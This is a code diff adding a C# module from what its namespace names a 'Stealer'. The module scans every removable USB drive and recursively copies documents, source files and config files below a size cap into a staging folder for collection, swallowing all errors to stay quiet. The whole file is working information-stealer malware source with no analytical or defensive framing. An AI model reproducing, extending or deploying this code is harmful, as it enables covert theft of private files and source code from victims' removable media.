@@ -1,0 +1,91 @@
+﻿using System;
+using System.IO;
+
+namespace Stealer.modules
+{
+  internal class USB
+  {
+    private static string GrabberDir = Program.path + "\\FilesUSB\\";
+
+    public static void GetUSB()
+    {
+      USB.Copy();
+    }
+
+    private static void Copy()
+    {
+      foreach (DriveInfo drive in DriveInfo.GetDrives())
+      {
+        if (drive.IsReady && drive.DriveType == DriveType.Removable)
+        {
+          try
+          {
+            if (!Directory.Exists(USB.GrabberDir))
+              Directory.CreateDirectory(USB.GrabberDir);
+            USB.CopyDisk(drive.Name, USB.GrabberDir);
+          }
+          catch
+          {
+          }
+        }
+      }
+    }
+
+    public static void CopyDisk(string DirectoryDisk, string LogsPath)
+    {
+      try
+      {
+        if (USB.GetDirSize(LogsPath, 0L) >= 4500000L)
+          return;
+        if (Directory.GetFiles(DirectoryDisk) != null)
+        {
+          foreach (string file in Directory.GetFiles(DirectoryDisk))
+          {
+            string extension = Path.GetExtension(file);
+            if ((extension == ".txt" || extension == ".doc" || (extension == ".cs" || extension == ".dll") || (extension == ".sln" || extension == ".html" || (extension == ".htm" || extension == ".xml")) || (extension == ".php" || extension == ".json")) && (new FileInfo(file).Length != 0L && new FileInfo(file).Length < 2500000L))
+              File.Copy(file, Path.Combine(LogsPath, Path.GetFileName(file)));
+          }
+        }
+        if (Directory.GetDirectories(DirectoryDisk) != null)
+        {
+          foreach (string directory in Directory.GetDirectories(DirectoryDisk))
+            USB.CopyDisk(directory, LogsPath);
+        }
+      }
+      catch
+      {
+      }
+    }
+
+    public static long GetDirSize(string path, long size = 0)
+    {
+      try
+      {
+        foreach (string enumerateFile in Directory.EnumerateFiles(path))
+        {
+          try
+          {
+            size += new FileInfo(enumerateFile).Length;
+          }
+          catch
+          {
+          }
+        }
+        foreach (string enumerateDirectory in Directory.EnumerateDirectories(path))
+        {
+          try
+          {
+            size += USB.GetDirSize(enumerateDirectory, 0L);
+          }
+          catch
+          {
+          }
+        }
+      }
+      catch
+      {
+      }
+      return size;
+    }
+  }
+}
